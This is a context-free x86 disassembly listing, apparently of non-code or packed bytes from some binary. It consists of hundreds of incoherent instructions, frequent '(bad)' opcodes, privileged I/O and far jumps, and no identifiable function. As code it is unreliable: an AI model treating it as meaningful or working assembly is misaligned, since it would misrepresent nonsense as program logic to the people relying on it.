  4151ed:	mov    ecx,0xb1a9202f
  4151f2:	stc    
  4151f3:	(bad)  [esi-0x24]
  4151f6:	mov    eax,0xb88f760e
  4151fb:	adc    ch,BYTE PTR [esi-0x2ff99bf8]
  415201:	jmp    0x4151b4
  415203:	ds ja  0x415233
  415206:	lods   eax,DWORD PTR ds:[esi]
  415207:	cmp    DWORD PTR [ecx],eax
  415209:	sbb    al,0x9f
  41520b:	cmp    eax,0x2b82ef55
  415210:	jl     0x4151fc
  415212:	dec    edi
  415213:	rcr    BYTE PTR [bp+di],cl
  415216:	and    eax,DWORD PTR [ebx+0x13]
  415219:	sub    eax,0xa308a48d
  41521e:	xor    BYTE PTR es:[edi],dl
  415221:	sar    DWORD PTR [eax+0x722f4e6e],1
  415227:	lock addr16 cld 
  41522a:	call   0xedb6:0x7fa4abbe
  415231:	jno    0x4151d2
  415233:	sbb    DWORD PTR [esi],ebp
  415235:	push   cs
  415236:	dec    edx
  415237:	cmp    eax,0x7c86d55b
  41523c:	icebp  
  41523d:	push   edx
  41523e:	not    dh
  415240:	dec    ecx
  415241:	sub    al,0x96
  415243:	(bad)  
  415245:	sub    al,0xf1
  415247:	mov    al,0xf7
  415249:	add    ebp,edx
  41524b:	(bad)  
  41524d:	bound  ebx,QWORD PTR [ecx]
  41524f:	test   DWORD PTR [ebx-0x6b],ebx
  415252:	pop    ss
  415253:	pop    ecx
  415254:	dec    ebp
  415255:	jecxz  0x41523d
  415257:	js     0x41522c
  415259:	push   0xffffffff
  41525b:	push   ds
  41525c:	add    eax,0x2cd8d10c
  415261:	mov    bl,0x67
  415263:	jle    0x4152d8
  415265:	xchg   esi,eax
  415266:	bound  eax,QWORD PTR [edi*1+0x32d3374e]
  41526d:	push   ebp
  41526e:	aad    0x96
  415270:	jns    0x41525d
  415272:	pop    DWORD PTR [ecx+0x3d4497a7]
  415278:	pop    esi
  415279:	gs mov esi,0x39995758
  41527f:	lahf   
  415280:	or     eax,0x35d621b0
  415285:	adc    DWORD PTR [esi-0x5238dded],ebx
  41528b:	nop
  41528c:	lods   eax,DWORD PTR ds:[esi]
  41528d:	imul   edx,DWORD PTR [ebp-0x7e8e84d0],0x2915577e
  415297:	cdq    
  415298:	pop    edi
  415299:	lods   al,BYTE PTR ds:[esi]
  41529a:	enter  0xb575,0x68
  41529e:	iret   
  41529f:	lods   al,BYTE PTR ds:[esi]
  4152a0:	enter  0xa619,0x20
  4152a4:	imul   BYTE PTR [ecx+0x38]
  4152a7:	inc    ebx
  4152a8:	movapd xmm5,XMMWORD PTR [ecx]
  4152ac:	gs pop eax
  4152ae:	and    BYTE PTR [ebp+0x10],bh
  4152b1:	push   edx
  4152b2:	inc    esp
  4152b3:	adc    eax,0xaf631955
  4152b8:	jbe    0x415258
  4152ba:	push   0x45fc41b1
  4152bf:	inc    edi
  4152c0:	push   es
  4152c1:	mov    ah,0x86
  4152c3:	sbb    cl,BYTE PTR ds:0x45f9f184
  4152c9:	xchg   DWORD PTR [edi+0x7ddabbb7],esp
  4152cf:	dec    ebp
  4152d0:	xor    dh,0x1b
  4152d3:	add    DWORD PTR [edx-0xe843ef3],0xffffffe9
  4152da:	repnz cmp eax,DWORD PTR [esi-0x38]
  4152de:	out    0x81,al
  4152e0:	xor    BYTE PTR [eax-0x80],0x5a
  4152e4:	and    DWORD PTR [edi+esi*2-0xa],0x46
  4152e9:	mov    al,0x3e
  4152eb:	xor    BYTE PTR [edi-0x26],dl
  4152ee:	ffree  st(4)
  4152f0:	mov    ecx,0xcc623cd6
  4152f5:	push   eax
  4152f6:	mov    ds:0xcb31e922,eax
  4152fb:	in     eax,dx
  4152fc:	xchg   edi,eax
  4152fd:	xor    DWORD PTR [ebx],0x4ca574b0
  415303:	lods   al,BYTE PTR ds:[esi]
  415304:	push   ss
  415305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415306:	mov    dh,0x18
  415308:	or     dh,BYTE PTR [edx+0x4f]
  41530b:	cmp    DWORD PTR [esi+0x16edbb6f],esp
  415311:	cmp    eax,0xf59de2b9
  415316:	mov    DWORD PTR [eax-0x6d],ebp
  415319:	xor    eax,0xbdb21fcd
  41531e:	rcl    DWORD PTR [ecx-0xb79263a],cl
  415324:	mov    cl,0x4b
  415326:	(bad)  
  415327:	and    ch,cl
  415329:	cmp    esp,0xffffff89
  41532c:	dec    ebp
  41532d:	lods   al,BYTE PTR ds:[esi]
  41532e:	cmp    DWORD PTR [ecx-0x19],0x8f05ed55
  415335:	imul   ebp,ebp,0x43
  415338:	add    DWORD PTR [edi-0x27],0x36
  41533c:	cwde   
  41533d:	jae    0x4152fc
  41533f:	sub    al,0xec
  415341:	mov    dh,0xde
  415343:	es mov cl,0xfc
  415346:	mov    eax,0x71f9de72
  41534b:	enter  0x7834,0x93
  41534f:	pop    ecx
  415350:	shr    BYTE PTR [edx-0x77],cl
  415353:	out    dx,eax
  415354:	inc    eax
  415355:	sar    BYTE PTR [esi+0x3d9a26f7],0xd0
  41535c:	mov    esp,0x5450fc4b
  415361:	pop    ecx
  415362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415363:	imul   esp,DWORD PTR [ebp+eiz*4+0x3051c21e],0x4c
  41536b:	fldenv [edx-0xe76afd4]
  415371:	mov    dl,0x22
  415373:	sti    
  415374:	or     al,BYTE PTR [esi]
  415376:	cmp    al,0xd9
  415378:	les    ebx,FWORD PTR [eax]
  41537a:	call   0x72f64506
  41537f:	xor    DWORD PTR [ebp+0xdeae2b6],0xd0f35f46
  415389:	stos   BYTE PTR es:[edi],al
  41538a:	ds (bad) 
  41538c:	and    ah,BYTE PTR [ecx+0x12531c84]
  415392:	mov    BYTE PTR [ebp+eax*4+0x32784692],ah
  415399:	call   0x35aa61e2
  41539e:	outs   dx,BYTE PTR ds:[esi]
  41539f:	cmc    
  4153a0:	xchg   edi,eax
  4153a1:	jne    0x415407
  4153a3:	sub    al,0xf2
  4153a5:	jp     0x415329
  4153a7:	mov    edx,0xd56ec9ae
  4153ac:	dec    ebp
  4153ad:	sub    bl,BYTE PTR [eax]
  4153af:	out    0x4d,eax
  4153b1:	fiadd  DWORD PTR [ebx-0x49]
  4153b4:	ins    DWORD PTR es:[edi],dx
  4153b5:	stos   BYTE PTR es:[edi],al
  4153b6:	push   ebp
  4153b7:	inc    ebp
  4153b8:	mov    ebx,0x316320fa
  4153bd:	(bad)  
  4153be:	xchg   esi,eax
  4153bf:	rcr    DWORD PTR [ecx+0x17d87c60],cl
  4153c5:	xor    al,0x2d
  4153c7:	and    BYTE PTR [edi+0x61],0xe1
  4153cb:	fld    QWORD PTR [esp+ecx*2]
  4153ce:	adc    DWORD PTR [eax],ebx
  4153d0:	das    
  4153d1:	cs loopne 0x4153e2
  4153d4:	cld    
  4153d5:	fild   DWORD PTR [edi]
  4153d7:	call   0xa734:0x45607973
  4153de:	stos   BYTE PTR es:[edi],al
  4153df:	xchg   ebp,eax
  4153e0:	and    al,0xbf
  4153e2:	pop    edx
  4153e3:	jl     0x41538e
  4153e5:	pop    ecx
  4153e6:	and    ecx,ecx
  4153e8:	dec    ebx
  4153e9:	sar    DWORD PTR [edx],1
  4153eb:	fild   QWORD PTR [ecx+ebp*2+0x16445b4b]
  4153f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f3:	cli    
  4153f4:	push   0x57
  4153f6:	std    
  4153f7:	dec    ecx
  4153f8:	pusha  
  4153f9:	push   edx
  4153fa:	adc    eax,DWORD PTR [eax]
  4153fc:	xlat   BYTE PTR ds:[ebx]
  4153fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153fe:	mov    ch,0x3a
  415400:	mov    edx,0x419348d5
  415405:	inc    esi
  415406:	mov    eax,ds:0xd25ef171
  41540b:	ret    0xa4ff
  41540e:	jmp    FWORD PTR [eax+esi*2-0x3fac815f]
  415415:	ins    DWORD PTR es:[edi],dx
  415416:	mov    ch,0x19
  415418:	ror    edx,cl
  41541a:	mov    cl,cl
  41541c:	test   BYTE PTR [esp+ecx*4-0x7a67bff5],dh
  415423:	inc    eax
  415424:	lahf   
  415425:	hlt    
  415426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415427:	loop   0x415436
  415429:	add    al,0x70
  41542b:	pushf  
  41542c:	or     edi,esp
  41542e:	je     0x41540c
  415430:	adc    DWORD PTR [eax+ebx*8],ecx
  415433:	cmp    al,0xa4
  415435:	outs   dx,DWORD PTR ds:[esi]
  415436:	imul   edx,DWORD PTR [eax-0xc],0x23
  41543a:	clc    
  41543b:	pushf  
  41543c:	ins    BYTE PTR es:[edi],dx
  41543d:	ja     0x415434
  41543f:	mov    ebx,0x1eefe6c4
  415444:	scas   al,BYTE PTR es:[edi]
  415445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415446:	mov    dh,0xec
  415448:	repz jp 0x4153d6
  41544b:	repz sti 
  41544d:	jl     0x41546e
  41544f:	mov    DWORD PTR [eax],edi
  415451:	adc    bl,BYTE PTR [ebp+0x4]
  415454:	mov    dh,0x4c
  415456:	jmp    0x41542c
  415458:	pop    eax
  415459:	xor    eax,0xe9d01fcb
  41545e:	xchg   ebx,eax
  41545f:	lods   al,BYTE PTR ds:[esi]
  415460:	cmp    DWORD PTR [edi],eax
  415462:	inc    eax
  415463:	dec    ebp
  415464:	and    al,0xa9
  415466:	fistp  QWORD PTR [edi+0x14]
  415469:	inc    ebx
  41546a:	cmp    al,0x1a
  41546c:	push   DWORD PTR [edi+eax*8]
  41546f:	mov    ebx,0x87b8582f
  415474:	sbb    DWORD PTR [ebx-0x22981cbe],ecx
  41547a:	sub    dh,bl
  41547c:	(bad)  
  41547d:	fist   WORD PTR [ebp+0x3df5864b]
  415483:	test   BYTE PTR [ebx+eax*2+0x7f044fb0],0x4f
  41548b:	stc    
  41548c:	pop    edx
  41548d:	xor    DWORD PTR [ecx+0x5d2b176c],edi
  415493:	mov    ah,0x2e
  415495:	mov    esp,0x11058c1
  41549a:	enter  0x2cb2,0xb9
  41549e:	lea    edx,[edx-0x5c97c2a4]
  4154a4:	or     DWORD PTR [esi+esi*2-0x38],0x6d
  4154a9:	scas   eax,DWORD PTR es:[edi]
  4154aa:	test   eax,0x36b2e58a
  4154af:	push   es
  4154b0:	cli    
  4154b1:	cli    
  4154b2:	inc    ecx
  4154b3:	cmc    
  4154b4:	das    
  4154b5:	push   es
  4154b6:	sbb    ch,BYTE PTR [ebx]
  4154b8:	jno    0x415457
  4154ba:	jp     0x41544e
  4154bc:	mov    ch,0x6a
  4154be:	push   ebx
  4154bf:	sub    bh,BYTE PTR [edi]
  4154c1:	lock and BYTE PTR [edx-0x109a6910],dh
  4154c8:	push   ds
  4154c9:	(bad)  
  4154ca:	jns    0x4154f0
  4154cc:	dec    ebx
  4154cd:	adc    eax,0x9de46646
  4154d2:	popa   
  4154d3:	out    dx,eax
  4154d4:	stos   DWORD PTR es:[edi],eax
  4154d5:	mov    cl,0x45
  4154d7:	aad    0x8b
  4154d9:	mov    ecx,0x16dcc28b
  4154de:	jmp    0x4154ed
  4154e0:	push   ds
  4154e1:	clc    
  4154e2:	shl    DWORD PTR [esi-0x43],0x1d
  4154e6:	data16 int 0xd1
  4154e9:	daa    
  4154ea:	test   eax,0x350b2d7e
  4154ef:	fisttp QWORD PTR [esi]
  4154f1:	jns    0x415572
  4154f3:	(bad)  
  4154f5:	(bad)  
  4154f8:	xor    DWORD PTR [ecx-0x129bf327],ebp
  4154fe:	ret    
  4154ff:	xchg   ebp,eax
  415500:	push   es
  415501:	or     ch,BYTE PTR [ecx-0x40]
  415504:	cmp    BYTE PTR [ecx+0x48b017f8],0xa3
  41550b:	push   edx
  41550c:	outs   dx,BYTE PTR ds:[esi]
  41550d:	in     eax,dx
  41550e:	jp     0x415557
  415510:	push   ss
  415511:	mov    WORD PTR [ebx-0x3b],cs
  415514:	cmp    DWORD PTR [esi+0x17],0xffffffb7
  415518:	pop    eax
  415519:	pop    ebp
  41551a:	push   edi
  41551b:	clc    
  41551c:	push   esi
  41551d:	mov    ah,0x80
  41551f:	les    esi,FWORD PTR [ebx]
  415521:	mov    esp,0xc482af67
  415526:	icebp  
  415527:	fdiv   QWORD PTR [ebx-0x733e1020]
  41552d:	xchg   esi,eax
  41552e:	lods   al,BYTE PTR ds:[esi]
  41552f:	jmp    0x46b5:0x1975abd8
  415536:	cs jnp 0x41552c
  415539:	or     al,0xed
  41553c:	les    edi,FWORD PTR [edi-0x15]
  41553f:	mov    bl,0x8a
  415541:	sub    BYTE PTR [eax],dh
  415543:	sub    DWORD PTR [eax],edx
  415545:	mov    edi,0x4d299e5
  41554a:	lods   al,BYTE PTR ds:[esi]
  41554b:	cs dec ebx
  41554d:	pop    edx
  41554e:	pop    ebx
  41554f:	fld    DWORD PTR [eax]
  415551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415552:	add    ecx,DWORD PTR [ecx-0x98f311e]
  415558:	xor    al,BYTE PTR [eax+eiz*2]
  41555b:	inc    esi
  41555c:	(bad)  
  41555d:	fld    st(4)
  41555f:	imul   eax,DWORD PTR [edi-0x4b3eb4da],0x6b
  415566:	add    BYTE PTR [ebx-0x20],ch
  415569:	int3   
  41556a:	sub    BYTE PTR [esi],dl
  41556c:	push   cs
  41556d:	sbb    BYTE PTR [esp+ebx*8],dh
  415570:	mov    ebp,0x4056fcb5
  415575:	call   0x408062e
  41557a:	jl     0x4154fd
  41557c:	mov    BYTE PTR [edx-0x61],ah
  41557f:	sub    al,0xcf
  415581:	xor    al,0x2c
  415583:	sub    eax,0x62264cb0
  415588:	popa   
  415589:	push   ebp
  41558a:	sbb    ah,BYTE PTR [esi+0x34]
  41558d:	sar    bl,cl
  41558f:	test   eax,0x589238fc
  415594:	jp     0x41553f
  415596:	leave  
  415597:	add    esi,DWORD PTR [esi+eax*4-0xb]
  41559b:	adc    edx,DWORD PTR [edx+0xb]
  41559e:	push   ss
  41559f:	dec    esp
  4155a0:	lods   al,BYTE PTR ds:[esi]
  4155a1:	xchg   BYTE PTR [edi+0x3f],ah
  4155a4:	imul   ecx,DWORD PTR [edi-0x7d],0x277a6517
  4155ab:	jp     0x415537
  4155ad:	ds ds push ds
  4155b0:	cmp    DWORD PTR ss:[edx+0x127c9cd3],ecx
  4155b7:	adc    ah,bl
  4155b9:	neg    BYTE PTR [ebp-0xa]
  4155bc:	mov    dl,BYTE PTR [ebx+0x5e9d442d]
  4155c2:	sbb    al,0x6
  4155c4:	xlat   BYTE PTR ds:[ebx]
  4155c5:	jmp    FWORD PTR [esi]
  4155c7:	xchg   esp,eax
  4155c8:	int3   
  4155c9:	ds (bad) 
  4155cd:	inc    edx
  4155ce:	mov    ebx,0x7cb4146c
  4155d3:	int    0x43
  4155d5:	push   0xfc290c4
  4155da:	mov    bl,ch
  4155dc:	(bad)  
  4155dd:	jbe    0x4155bc
  4155df:	les    ebp,FWORD PTR gs:[ebx]
  4155e2:	and    eax,DWORD PTR [edi]
  4155e4:	push   eax
  4155e5:	xor    cl,BYTE PTR [eax+0x11]
  4155e8:	xchg   esp,eax
  4155e9:	imul   esi,ebp,0x3eb490ca
  4155ef:	call   0xd40:0xc4ad0716
  4155f6:	push   es
  4155f7:	mov    ds:0xe7e25344,al
  4155fc:	out    0x35,eax
  4155fe:	cmp    edi,DWORD PTR [ebp+0x21da97a5]
  415604:	add    DWORD PTR [edi],esi
  415606:	cdq    
  415607:	sub    bh,BYTE PTR [ebx-0x76]
  41560a:	xor    ah,BYTE PTR [edx-0x329990a9]
  415610:	es and edx,ecx
  415613:	pop    es
  415614:	mov    cl,0x93
  415616:	jg     0x4155a5
  415618:	push   esp
  415619:	pop    ecx
  41561a:	mov    bh,0x2a
  41561c:	cwde   
  41561d:	icebp  
  41561e:	addr16 fs push esi
  415621:	or     al,0x79
  415623:	mov    ebx,0xd4774f4a
  415628:	cmp    BYTE PTR [esi-0x4a],bl
  41562b:	enter  0x84c4,0xa2
  41562f:	xchg   edi,eax
  415630:	push   ebx
  415631:	mov    ds:0x8400f675,eax
  415636:	or     ecx,DWORD PTR [edx]
  415638:	inc    ebx
  415639:	xchg   BYTE PTR [edi],al
  41563b:	scas   eax,DWORD PTR es:[edi]
  41563c:	xor    DWORD PTR [edi-0x698f263f],ecx
  415642:	rcl    BYTE PTR ds:0xc13c10a0,0x1a
  415649:	popf   
  41564a:	cmp    DWORD PTR [ecx+0x490153f],ebx
  415650:	lea    esi,[ebx+edi*2+0x3e]
  415654:	mov    ebx,?
  415656:	icebp  
  415657:	dec    esi
  415658:	push   ebx
  415659:	jae    0x41564c
  41565b:	or     eax,0x714b3d06
  415660:	loop   0x415626
  415662:	aad    0x14
  415664:	jo     0x41561a
  415666:	jle    0x41563d
  415668:	xor    DWORD PTR [ecx-0x1e],0xfffffff9
  41566c:	xchg   ebp,eax
  41566d:	mov    ah,BYTE PTR [esi]
  41566f:	in     eax,dx
  415670:	shl    BYTE PTR [edi-0x7a],1
  415673:	push   ecx
  415674:	mov    ecx,0xcaa79bac
  415679:	mov    edx,0xa549fd4c
  41567e:	lods   al,BYTE PTR ds:[esi]
  41567f:	div    DWORD PTR [esi+0x15e5a51c]
  415685:	jne    0x4156f1
  415687:	aam    0xf1
  415689:	sbb    al,BYTE PTR [eax]
  41568b:	popa   
  41568c:	pushf  
  41568d:	xchg   esp,eax
  41568e:	xor    DWORD PTR [edi],ebp
  415690:	fild   DWORD PTR [ebp-0x7a]
  415693:	leave  
  415694:	cli    
  415695:	inc    edx
  415696:	mov    dl,0x36
  415698:	mov    ecx,0x9d150067
  41569d:	packssdw mm3,QWORD PTR [ebx+ebx*1]
  4156a1:	and    ah,BYTE PTR [ecx+0x919e7e6]
  4156a7:	inc    edx
  4156a8:	(bad)  [ebx]
  4156aa:	out    dx,al
  4156ab:	(bad)  
  4156ac:	jbe    0x4156eb
  4156ae:	mov    ah,0x11
  4156b0:	dec    edx
  4156b1:	sti    
  4156b2:	mov    dh,0xdb
  4156b4:	icebp  
  4156b5:	retf   
  4156b6:	push   edx
  4156b7:	lds    ebp,FWORD PTR [edi+0x29]
  4156ba:	and    BYTE PTR [ebx+0x21],cl
  4156bd:	and    ah,BYTE PTR [ecx+0x91a7f22]
  4156c3:	push   ebx
  4156c4:	mov    dl,0x46
  4156c6:	popa   
  4156c7:	in     eax,dx
  4156c8:	lea    ebx,[ebx-0x5b64a086]
  4156ce:	repz sar DWORD PTR [edx],0x71
  4156d2:	xchg   edx,eax
  4156d3:	enter  0x43a5,0x16
  4156d7:	aas    
  4156d8:	inc    esp
  4156d9:	mov    ch,BYTE PTR [esi]
  4156db:	ins    DWORD PTR es:[edi],dx
  4156dc:	leave  
  4156dd:	pushf  
  4156de:	pop    ss
  4156df:	aas    
  4156e0:	enter  0x2fa4,0x11
  4156e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156e5:	ret    0xb951
  4156e8:	mov    bh,0xe0
  4156ea:	or     eax,0x1c739ae4
  4156ef:	add    al,0x76
  4156f1:	retf   
  4156f2:	loope  0x4156f5
  4156f4:	push   edx
  4156f5:	or     BYTE PTR [edi-0x5c],al
  4156f8:	xchg   edi,eax
  4156f9:	dec    edx
  4156fa:	mov    eax,0xa4ec557f
  4156ff:	push   ebp
  415700:	pop    esi
  415701:	rol    BYTE PTR [ebp+0x5b991523],0xc5
  415708:	fsub   DWORD PTR [ebp-0x7d1f8333]
  41570e:	les    eax,FWORD PTR [ebp+0xc]
  415711:	sub    esi,edx
  415713:	mov    ch,0x65
  415715:	(bad)  
  415716:	sbb    esp,ecx
  415718:	sbb    al,0x26
  41571a:	sub    eax,0xc55f0962
  41571f:	mov    bl,0x41
  415721:	loop   0x4156b2
  415723:	into   
  415724:	addr16 inc eax
  415726:	sahf   
  415727:	add    BYTE PTR [ecx+0x28],bh
  41572a:	mov    cl,0x4a
  41572c:	push   ebp
  41572d:	cmp    ebx,DWORD PTR [ebp+0x5e72bd95]
  415733:	add    ebx,ebp
  415735:	dec    edi
  415736:	fnsave [esi+0x17]
  415739:	clc    
  41573a:	xor    DWORD PTR [edx+ebx*1+0x5a47c344],ebp
  415741:	(bad)  
  415742:	dec    esi
  415743:	dec    ebp
  415744:	scas   eax,DWORD PTR es:[edi]
  415745:	sub    ebx,esi
  415747:	mov    bh,0x50
  415749:	ret    0xde97
  41574c:	push   ebx
  41574d:	(bad)  
  41574e:	aam    0xf5
  415750:	or     al,0x4f
  415752:	push   ecx
  415753:	or     BYTE PTR [edi],dh
  415755:	xchg   ebx,eax
  415756:	and    al,0xe3
  415758:	sub    dh,cl
  41575a:	dec    edi
  41575b:	adc    bh,BYTE PTR [ebx]
  41575d:	mov    dh,0x18
  41575f:	das    
  415760:	imul   esi
  415762:	push   edx
  415763:	aas    
  415764:	test   DWORD PTR [ecx+0x1b],ecx
  415767:	inc    esp
  415768:	fidivr DWORD PTR [esi+eiz*2]
  41576b:	mov    al,0x40
  41576d:	(bad)  
  41576e:	ins    DWORD PTR es:[edi],dx
  41576f:	rol    BYTE PTR [edi+0x7a],1
  415772:	jle    0x41577a
  415774:	inc    ebp
  415775:	iret   
  415776:	sub    eax,DWORD PTR [ebp-0x3e]
  415779:	cmp    eax,0x4a7e3972
  41577e:	xchg   ebp,eax
  41577f:	inc    esi
  415780:	arpl   WORD PTR [edx+0x6d],si
  415783:	jne    0x4157f7
  415785:	inc    eax
  415786:	(bad)  
  415787:	cmp    DWORD PTR [ecx],esi
  415789:	xor    ch,BYTE PTR [edx]
  41578b:	cmp    ecx,DWORD PTR [ebx]
  41578d:	mov    ecx,fs
  41578f:	push   eax
  415790:	adc    dl,BYTE PTR [esi+0x11]
  415793:	cmp    eax,0xcd8b9c64
  415798:	sub    DWORD PTR [edi],esi
  41579a:	dec    edx
  41579b:	sar    BYTE PTR [edx-0x6628bf9b],cl
  4157a1:	inc    edx
  4157a2:	jmp    0x41576b
  4157a4:	out    0x25,al
  4157a6:	jl     0x415737
  4157a8:	sub    esi,DWORD PTR [edx+0x4dded875]
  4157ae:	add    BYTE PTR [edx-0x2afe40c9],dl
  4157b4:	mov    ds:0xb74b9d2f,al
  4157b9:	dec    esi
  4157ba:	sbb    bl,BYTE PTR [esi-0x6b]
  4157bd:	jle    0x415757
  4157bf:	scas   al,BYTE PTR es:[edi]
  4157c0:	or     al,0xba
  4157c2:	inc    eax
  4157c3:	cmp    BYTE PTR [esi+ebp*4],bh
  4157c6:	inc    BYTE PTR [eax+0x548ca27e]
  4157cc:	xor    al,0xbd
  4157ce:	inc    edi
  4157cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157d0:	sbb    WORD PTR [edi-0x21],sp
  4157d4:	ret    0xd019
  4157d7:	pusha  
  4157d8:	dec    ebp
  4157d9:	stos   DWORD PTR es:[edi],eax
  4157da:	inc    edi
  4157db:	fcom   QWORD PTR [eax-0x73]
  4157de:	add    al,0xfb
  4157e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e1:	cmp    al,0x48
  4157e3:	hlt    
  4157e4:	cli    
  4157e5:	sbb    ah,cl
  4157e7:	mov    ds:0x742b45f8,al
  4157ec:	xchg   esi,eax
  4157ed:	out    dx,al
  4157ee:	xchg   edi,eax
  4157ef:	mov    ch,0x20
  4157f1:	pop    eax
  4157f2:	mov    eax,ds:0x39cf93d2
  4157f7:	sbb    al,0xc9
  4157f9:	pop    edx
  4157fa:	pop    es
  4157fb:	dec    esi
  4157fc:	(bad)  
  4157fd:	fwait
  4157fe:	mov    WORD PTR [esi],es
  415800:	mov    gs,eax
  415802:	adc    al,0x35
  415804:	sbb    BYTE PTR [ebx+0x15],dl
  415807:	push   eax
  415808:	pop    ds
  415809:	sahf   
  41580a:	popf   
  41580b:	fisttp WORD PTR [edx+0x231f4b8b]
  415811:	cli    
  415812:	lods   eax,DWORD PTR ds:[esi]
  415813:	pop    edx
  415814:	lods   eax,DWORD PTR ds:[esi]
  415815:	xor    BYTE PTR [esi+0x42],bl
  415818:	popf   
  415819:	bound  ecx,QWORD PTR [eax-0x50f11cd5]
  41581f:	jge    0x41589b
  415821:	mov    ecx,0x2bd0eed0
  415826:	repz cmp bh,BYTE PTR [ebp+0x27]
  41582a:	sahf   
  41582b:	sbb    BYTE PTR [ebx],bh
  41582d:	loope  0x415815
  41582f:	dec    dl
  415831:	mov    bl,0xaa
  415833:	inc    ecx
  415834:	stos   BYTE PTR es:[edi],al
  415835:	fs xchg edi,eax
  415837:	sbb    eax,0x3c3f05f1
  41583c:	xchg   ebp,eax
  41583d:	push   ss
  41583e:	inc    esp
  41583f:	out    dx,eax
  415840:	add    bl,cl
  415842:	push   edx
  415843:	xor    al,0xaa
  415845:	fwait
  415846:	xor    esp,DWORD PTR [ebp-0x52d0f0b5]
  41584c:	hlt    
  41584d:	lahf   
  41584e:	push   ds
  41584f:	es int 0x71
  415852:	iret   
  415853:	iret   
  415854:	arpl   WORD PTR [eax-0x34314183],di
  41585a:	gs mov dl,0x18
  41585d:	in     eax,dx
  41585e:	enter  0xc12d,0x7c
  415862:	cmp    eax,0x67e0fbee
  415867:	and    eax,0xed147064
  41586c:	mov    WORD PTR [ebx-0x14],es
  41586f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415870:	xor    ecx,DWORD PTR [ecx-0x5a]
  415873:	or     esi,ebx
  415875:	jp     0x4158d2
  415877:	je     0x4158c7
  415879:	jnp    0x415835
  41587b:	cmp    edx,DWORD PTR [eax+0x57]
  41587e:	pop    ss
  41587f:	mov    dh,0x41
  415881:	pop    esi
  415882:	sub    eax,0x60d74a50
  415887:	push   ebp
  415888:	pop    es
  415889:	inc    edi
  41588a:	pop    ss
  41588b:	adc    BYTE PTR [ecx+0x13c14d11],al
  415891:	mov    ebp,0xc3c30ce2
  415896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415897:	pop    ebp
  415898:	scas   al,BYTE PTR es:[edi]
  415899:	xor    BYTE PTR [ebp-0x2a],0x6a
  41589d:	test   BYTE PTR ds:0xcbe7c73,cl
  4158a3:	dec    eax
  4158a4:	out    dx,eax
  4158a5:	and    eax,0x37fb7bf6
  4158aa:	jno    0x415850
  4158ac:	dec    esi
  4158ad:	or     DWORD PTR [ecx+0x4eea0cd],esi
  4158b3:	das    
  4158b4:	jge    0x41586c
  4158b6:	js     0x4158f4
  4158b8:	xchg   ecx,eax
  4158b9:	mov    al,BYTE PTR [ecx]
  4158bb:	pop    ds
  4158bc:	xchg   ecx,eax
  4158bd:	call   0x1c8be21f
  4158c2:	daa    
  4158c3:	leave  
  4158c4:	xchg   edx,eax
  4158c5:	push   ecx
  4158c6:	mov    ah,bl
  4158c8:	outs   dx,DWORD PTR ds:[esi]
  4158c9:	inc    ebx
  4158ca:	pop    ds
  4158cb:	vmovapd xmm2,XMMWORD PTR [esi]
  4158cf:	das    
  4158d0:	mov    ch,0xe1
  4158d2:	adc    ah,0x43
  4158d5:	nop
  4158d6:	and    BYTE PTR [edx-0x29],ch
  4158d9:	clc    
  4158da:	adc    al,0xe5
  4158dc:	and    DWORD PTR ds:0xd9fe5e31,esp
  4158e2:	ds fucomp st(3)
  4158e5:	or     DWORD PTR [esi+0x71],edx
  4158e8:	popf   
  4158e9:	icebp  
  4158ea:	test   al,0x58
  4158ec:	rcl    BYTE PTR [edx+eax*4+0x3b5ad06],0x1e
  4158f4:	add    ah,al
  4158f6:	popf   
  4158f7:	(bad)  
  4158f8:	ins    BYTE PTR es:[edi],dx
  4158f9:	mov    eax,ds
  4158fb:	or     BYTE PTR [ecx],dl
  4158fd:	loope  0x41589a
  4158ff:	jbe    0x415948
  415901:	retf   0x8df0
  415904:	repnz daa 
  415906:	and    bl,bh
  415908:	dec    ebp
  415909:	pusha  
  41590a:	imul   DWORD PTR [eax-0x6d]
  41590d:	mov    ah,0xe5
  41590f:	mov    ebp,0x2c8ec81f
  415914:	iret   
  415915:	ret    0x53d6
  415918:	std    
  415919:	mov    edx,0x495bece
  41591e:	cmp    DWORD PTR [esi-0x27],0xffffff9b
  415922:	add    al,0xb8
  415924:	and    esp,DWORD PTR [ebp+0x2a]
  415927:	mov    dh,0xd
  415929:	ins    BYTE PTR es:[edi],dx
  41592a:	mov    al,0x9
  41592c:	pop    edi
  41592d:	sbb    ecx,DWORD PTR [edi-0x43ac62d8]
  415933:	push   cs
  415934:	(bad)  
  415936:	sbb    ah,ch
  415938:	js     0x415914
  41593a:	xor    DWORD PTR [ebx-0x11],esp
  41593d:	jnp    0x415936
  41593f:	icebp  
  415940:	int3   
  415941:	fwait
  415942:	aaa    
  415943:	out    0xc1,al
  415945:	ss loopne 0x41596b
  415948:	cmc    
  415949:	data16 mov al,0x29
  41594c:	pusha  
  41594d:	sti    
  41594e:	stc    
  41594f:	inc    edx
  415950:	ins    DWORD PTR es:[edi],dx
  415951:	mov    al,ds:0x689953ea
  415956:	cmc    
  415957:	jns    0x4159cc
  415959:	mov    esp,0x82c0c836
  41595e:	mov    ebp,ebp
  415960:	lahf   
  415961:	jne    0x415906
  415963:	int    0xad
  415965:	inc    edi
  415966:	dec    ebx
  415967:	pop    es
  415968:	jle    0x415915
  41596a:	out    dx,eax
  41596b:	lea    edi,[ecx-0x21]
  41596e:	mov    dh,0xc1
  415970:	in     eax,dx
  415971:	ret    
  415972:	push   es
  415973:	rol    BYTE PTR [ebp+eax*4+0x17],0x7e
  415978:	ret    0x9d98
  41597b:	mov    al,ds:0x3c7943b5
  415980:	popa   
  415981:	ds sbb al,0xb
  415984:	mov    dh,0x8d
  415986:	jmp    0x415a01
  415988:	dec    ebx
  415989:	or     eax,0xc3363d35
  41598e:	pop    ss
  41598f:	push   edx
